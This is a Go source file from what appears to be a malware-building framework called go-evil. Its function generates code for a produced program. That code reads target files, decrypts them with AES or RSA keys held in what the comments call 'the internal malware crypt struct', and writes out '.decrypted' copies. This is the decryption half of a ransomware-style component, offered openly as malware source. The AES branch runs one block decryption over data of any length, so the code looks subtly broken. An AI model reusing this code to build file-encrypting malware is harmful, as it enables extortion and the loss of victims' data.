package decrypt

import (
	"fmt"

	"github.com/s9rA16Bf4/go-evil/utility/structure/functions"
	"github.com/s9rA16Bf4/go-evil/utility/structure/json"
)

// Decrypts the provided target
// The input can follow this format '${"<crypto system>", "<key>", "<new extension>" , "target_1", "target_2", ... "target_N"}$'
// following the above format will "overwrite" all values in the struct before decrypting
// The struct meaning the internal malware crypt struct
func Decrypt(value string, data_object *json.Json_t) []string {
	call_history := []string{}
	function_call := "decrypt"

	if value != "" {
		call_history = preface_configuration(value, data_object)
	}

	data_object.Add_go_function(functions.Go_func_t{Name: function_call, Func_type: "", Part_of_struct: "", Return_type: "",
		Parameters: []string{},
		Gut: []string{
			"if spine.crypt.method == \"\" || len(spine.crypt.target) == 0 || (spine.crypt.aes_key_length == 0 && spine.crypt.rsa_key_length == 0) {",
			"spine.log(\"Method, target or/and key has not been set for decryption\")",
			"return",
			"}",
			"for _, target := range spine.crypt.target{",

			"target = spine.variable.get(target)",
			"gut, err := ioutil.ReadFile(target)",

			"if err != nil{",
			"spine.log(err.Error())",
			"return",
			"}",
			"dec := \"\"",

			"switch (spine.crypt.method){",

			"\tcase \"aes\":",
			"cipher, err := aes.NewCipher([]byte(spine.crypt.aes_key))",
			"if err != nil{",
			"spine.log(err.Error())",
			"return",
			"}",
			"cipher_text, err := hex.DecodeString(string(gut[:]))",
			"if err != nil{",
			"spine.log(err.Error())",
			"return",
			"}",
			"buffer := make([]byte, len(cipher_text))",
			"cipher.Decrypt(buffer, []byte(cipher_text))",
			"dec = string(buffer[:])",

			"\tcase \"rsa\":",
			"buffer, err := hex.DecodeString(string(gut[:]))",
			"if err != nil{",
			"spine.log(err.Error())",
			"return",
			"}",

			"buffer, err = spine.crypt.rsa_private.Decrypt(nil, buffer, &rsa.OAEPOptions{Hash: crypto.SHA256})",
			"if err != nil{",
			"spine.log(err.Error())",
			"return",
			"}",

			"dec = string(buffer[:])",

			"}",
			"if spine.crypt.extension == \"\"{",
			"spine.crypt.extension = \".decrypted\"",
			"}",

			"ioutil.WriteFile(fmt.Sprintf(\"%s%s\", target, spine.crypt.extension), []byte(dec), 0644)",
			"}",
		}})

	data_object.Add_go_import("os")
	data_object.Add_go_import("fmt")
	data_object.Add_go_import("io/ioutil")
	data_object.Add_go_import("encoding/hex")
	data_object.Add_go_import("crypto")
	data_object.Add_go_import("crypto/aes")
	data_object.Add_go_import("crypto/rsa")
	data_object.Add_go_import("crypto/sha256")
	data_object.Add_go_import("crypto/rand")
	data_object.Add_go_import("github.com/s9rA16Bf4/notify_handler/go/notify")

	call_history = append(call_history, fmt.Sprintf("%s()", function_call))

	return call_history
}
